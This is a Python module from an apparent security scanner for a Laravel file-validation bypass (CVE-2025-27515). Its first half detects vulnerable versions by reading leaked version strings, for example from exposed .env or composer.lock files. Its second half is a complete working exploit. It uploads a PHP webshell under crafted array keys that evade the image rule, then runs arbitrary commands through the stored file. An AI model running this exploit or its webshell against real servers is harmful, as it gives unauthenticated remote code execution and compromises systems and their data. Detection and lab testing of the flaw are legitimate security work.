#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2025-27515')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
# modules/cves/cve_2025_27515.py

"""
CVE-2025-27515 — Laravel Wildcard File Validation Bypass (SAFE DETECTION)

Summary:
    Laravel's wildcard validation mechanism (`files.*`) could be bypassed
    in certain versions, potentially allowing unauthorized file uploads.
    This module only performs safe detection by identifying the Laravel version
    from HTML body leaks, debug/.env output, or an exposed composer.lock file.

Affected Versions:
    - Laravel 10.x < 10.48.29
    - Laravel 11.x < 11.44.1
    - Laravel 12.0.0 <= version <= 12.1.0

Safe detection only: no exploit payloads are used.
"""

import re
from urllib.parse import urlparse
import requests

from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)


def _host_root(target_url: str) -> str:
    """Return scheme://netloc for target_url, dropping any path/query.

    check.py commits to a 'canonical base' that is resp.url after redirects. When
    the app's '/' route 302-redirects elsewhere (e.g. '/upload'), that base carries
    the redirect PATH -- a route redirect, not a sub-directory mount. Version-leak
    sources (/composer.lock aliased into the webroot, '/', /_debugbar, /.env) all
    live at the HOST ROOT, so probing base + '/composer.lock' would hit
    '/upload/composer.lock' -> 404 and the version (hence vulnerability) would be
    missed. Anchoring at scheme://netloc fixes this and is a no-op when the base
    is already a clean host root.
    """
    p = urlparse(target_url)
    if p.scheme and p.netloc:
        return f"{p.scheme}://{p.netloc}"
    return target_url.rstrip("/")

LARAVEL_VERSION_PATTERN = re.compile(
    r"Laravel\s*v?(\d+\.\d+\.\d+)", re.IGNORECASE
)


def _safe_get(sess, url, timeout=6):
    try:
        return sess.get(url, timeout=timeout, verify=False, allow_redirects=True)
    except Exception:
        return None


def _extract_version(text: str):
    if not text:
        return None
    m = LARAVEL_VERSION_PATTERN.search(text)
    return m.group(1) if m else None


def _normalize(version: str):
    try:
        parts = version.split(".")
        parts += ["0"] * (3 - len(parts))
        return tuple(int(p) for p in parts[:3])
    except Exception:
        return None


def _is_vulnerable(version: str):
    v = _normalize(version)
    if not v:
        return None

    major, minor, patch = v

    # 12.x: 12.0.0 <= v <= 12.1.0
    if major == 12 and _normalize("12.0.0") <= v <= _normalize("12.1.0"):
        return True

    # 11.x: v < 11.44.1
    if major == 11 and v < _normalize("11.44.1"):
        return True

    # 10.x and below: v < 10.48.29
    if major <= 10 and v < _normalize("10.48.29"):
        return True

    return False


def scan(target_url: str, *, session=None, username=None, password=None, **kwargs):
    sess = session or http_config.get_auth_session()

    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    # Anchor at the HOST ROOT. check.py may pass a canonical base carrying a route-
    # redirect path (e.g. '/upload'); version-leak sources (/composer.lock, '/',
    # /_debugbar, /.env) all live at the host root, so probing them off a '/upload'
    # base would 404 and the version detection (hence the verdict) would be missed.
    base = _host_root(target_url)

    result = {
        "cve_id": "CVE-2025-27515",
        "name": "Laravel Wildcard File Validation Bypass",
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "version": None,
        "version_status": "unknown",
        "evidence": [],
        "preconditions": [
            "web-reachable Laravel version source (HTML version leak, exposed /.env or "
            "/_debugbar, or an exposed /composer.lock); detection is version-only and never "
            "touches the upload route"
        ],
        "detection_methods": [],
    }

    # 1) Check main page for version leaks
    main = _safe_get(sess, base)
    if main is not None and main.text:
        ver = _extract_version(main.text)
        if ver:
            result["version"] = ver
            result["detection_methods"].append("version_html")
            result["evidence"].append(f"Laravel version leak: {ver}")

    # 2) Check common debug or version endpoints
    endpoints = ["/_debugbar", "/_debugbar/assets/javascript", "/.env", "/"]
    if not result["version"]:
        for ep in endpoints:
            r = _safe_get(sess, base + ep)
            if r is None:
                continue
            ver = _extract_version(r.text)
            if ver:
                result["version"] = ver
                result["detection_methods"].append(f"version_leak:{ep}")
                result["evidence"].append(f"Version found at {ep}: {ver}")
                break

    # 3) composer.lock exposure
    if not result["version"]:
        composer = _safe_get(sess, base + "/composer.lock")
        if composer is not None and composer.status_code == 200:
            try:
                data = composer.json()
                for pkg in data.get("packages", []):
                    if pkg.get("name") == "laravel/framework":
                        ver = pkg.get("version", "").lstrip("v")
                        if ver:
                            result["version"] = ver
                            result["detection_methods"].append("composer_lock")
                            result["evidence"].append(f"composer.lock version: {ver}")
                            break
            except Exception:
                pass

    # 4) Version-based vulnerability assessment
    if result["version"]:
        if _is_vulnerable(result["version"]):
            result["status"] = "version_applicable"
            result["verdict"] = "version_applicable"
            result["proof_type"] = "version"
            result["version_status"] = "vulnerable"
        else:
            result["status"] = "blocked_by_control"
            result["verdict"] = "blocked_by_control"
            result["version_status"] = "patched"
    else:
        result["version_status"] = "unknown"
        result["evidence"].append("No Laravel version leaks found")

    return result


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2025-27515 exploitation half — Laravel wildcard files.* validation bypass -> webshell RCE.

Split from the original modules/cve_2025_27515.py (detection half: modules/cves/cve_2025_27515.py).
Exploitation may import from modules root (shared infra) and modules.detection.
"""

import uuid
from urllib.parse import urlparse
import requests
from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)


def _host_root(target_url: str) -> str:
    """Return scheme://netloc for target_url, dropping any path/query.

    check.py commits to a 'canonical base' that is resp.url after redirects. For
    this lab '/' 302-redirects to '/upload', so the base check.py hands us is
    'http://host/upload' -- a ROUTE redirect, not a sub-directory mount. The
    vulnerable POST /upload and the /storage/<name> webshell readback both live
    at the HOST ROOT (see the lab's routes/web.php + apache.conf), exactly where
    the oracle hits them. Anchoring at scheme://netloc reproduces the oracle and
    is also correct in the no-redirect case (host root + /upload == clean base
    + /upload). Without this, base + '/upload' becomes '/upload/upload' -> 404.
    """
    p = urlparse(target_url)
    if p.scheme and p.netloc:
        return f"{p.scheme}://{p.netloc}"
    return target_url.rstrip("/")

# ---------------------------------------------------------------------------
# Active exploitation (CVE-2025-27515 — wildcard files.* validation bypass -> RCE)
# ---------------------------------------------------------------------------
#
# Root cause (GHSA-78fx-h6xr-vch4): Laravel's validator substitutes "." and "*"
# in attribute keys with a PER-INSTANCE random placeholder. For the fluent
# Illuminate\Validation\Rules\File rule, that placeholder could mismatch between
# the rule-parsing phase and the rule-evaluation phase, so a `files` array whose
# KEYS contain a literal "." (e.g. files[.], files[0.x]) is not covered by the
# `files.*` rule -- a non-image element (shell.php) slips past the image check.
#
# A vulnerable app stores accepted files under their ORIGINAL client name on a PUBLIC disk, so a
# bypassed .php can land at /storage/<name> and execute under Apache + mod_php -> RCE. The current
# Docker lab lives at `vuln-labs/framework/laravel/11.44.0/cve-2025-27515_wildcard-upload-rce_39005-40005`.
#
# The exploit never raises to the caller, returns the contract dict, and distinguishes genuine
# EXECUTION from a mere source-leak (uploaded .php served as text) by requiring the response body to
# NOT contain "<?php".

# Candidate crafted array keys that collide with the dot/asterisk placeholder
# substitution. files[<key>] places the file at $request->file('files')[<key>].
# Keys containing a literal "." slip the element past the fluent files.* File rule.
_BYPASS_KEYS = [".", "0.x", ".0", "0.", "*.*"]
_WEBSHELL = b"<?php system($_GET['cmd']); ?>\n"


def _exploit_result(success, vuln_class="rce", evidence="", detail="",
                    artifacts=None, requires=None, reason="", attempted=True):
    return {
        "cve": "CVE-2025-27515",
        "attempted": attempted,
        "success": success,
        "vuln_class": vuln_class,
        "evidence": evidence,
        "detail": detail,
        "artifacts": artifacts or {},
        "requires": requires or [],
        "reason": reason,
    }


def exploit(target_url: str, *, username: str = None, password: str = None,
            command: str = None, options: dict = None, session=None, **kwargs) -> dict:
    """Attempt the CVE-2025-27515 wildcard validation bypass -> webshell RCE.

    Unauthenticated. command defaults to "echo CVE-2025-27515 PoC && id && hostname". Returns the contract dict and
    NEVER raises. success=True only if the uploaded PHP webshell actually
    EXECUTED on the server (command output observed, body free of "<?php").
    """
    try:
        if not target_url.startswith(("http://", "https://")):
            target_url = "http://" + target_url
        # Anchor at the HOST ROOT, not the canonical base check.py committed to.
        # That base may carry a route-redirect path (e.g. '/upload' when '/' 302s
        # there); appending '/upload' to it yields '/upload/upload' -> 404. The
        # oracle hits POST /upload and GET /storage/<name> at the host root.
        base = _host_root(target_url)
        cmd = command or "echo CVE-2025-27515 PoC && id && hostname"
        upload_url = base + "/upload"

        shell_base = f"poc{uuid.uuid4().hex[:8]}"
        shell_name = f"{shell_base}.php"

        sess = session or http_config.get_auth_session()
        sess.headers.update({
            "User-Agent": http_config.BROWSER_USER_AGENT,
            "X-lvcscan": "CVE-2025-27515",
            "Accept": "application/json",
        })

        def _post(key):
            field = f"files[{key}]"
            files = {field: (shell_name, _WEBSHELL, "application/x-php")}
            return sess.post(upload_url, files=files, timeout=30, verify=False)

        def _shell_live():
            url = base + f"/storage/{shell_name}"
            probe = sess.get(url, params={"cmd": cmd}, timeout=15, verify=False)
            body = probe.text or ""
            # Genuine RCE: 200, non-empty, and the PHP source was NOT served as
            # text (presence of "<?php" means it landed but was NOT executed).
            if probe.status_code == 200 and body.strip() and "<?php" not in body:
                return url, body
            return None, body

        # Baseline: a non-image under the normal numeric key must be REJECTED
        # (HTTP 422), proving the files.* rule is actually active before we bypass.
        baseline_status = None
        try:
            baseline_status = _post("0").status_code
        except Exception:
            baseline_status = None

        attempts = []
        for key in _BYPASS_KEYS:
            try:
                r = _post(key)
            except Exception as e:
                attempts.append(f"files[{key!r}] -> request error: {e}")
                continue
            accepted = r.status_code in (200, 201)
            attempts.append(f"files[{key!r}] -> HTTP {r.status_code} "
                             f"({'accepted' if accepted else 'rejected'})")
            if not accepted:
                continue
            url, body = _shell_live()
            if url:
                evidence = (
                    f"baseline files[0] -> HTTP {baseline_status} (rule active); "
                    f"bypass via files[{key!r}] -> HTTP {r.status_code}; "
                    f"GET {url}?cmd={cmd} -> {body.strip()!r}"
                )
                return _exploit_result(
                    success=True,
                    evidence=evidence,
                    detail=(f"Wildcard files.* validation bypass via key '{key}' "
                            f"-> webshell RCE; `{cmd}` returned: {body.strip()}"),
                    artifacts={
                        "webshell_url": f"{url}?cmd=<command>",
                        "bypass_key": key,
                        "uploaded_name": shell_name,
                        "command": cmd,
                        "output": body.strip(),
                        "baseline_status": baseline_status,
                    },
                )

        # No key produced an executing webshell. Honest failure (no raise).
        detail = "; ".join(attempts) if attempts else "no upload attempts completed"
        return _exploit_result(
            success=False,
            detail="Wildcard validation bypass not confirmed",
            evidence=f"baseline files[0] -> HTTP {baseline_status}; " + detail,
            reason=("No crafted array key produced an executing webshell at "
                    "/storage/. The endpoint may be patched, the upload sink "
                    "may not be the public disk, or PHP is not executed there."),
            requires=["vulnerable_upload_endpoint"],
        )

    except Exception as e:
        return _exploit_result(
            success=False,
            detail="Exploit attempt errored",
            reason=f"Unexpected error during exploitation: {e}",
            requires=["reachable_target"],
        )
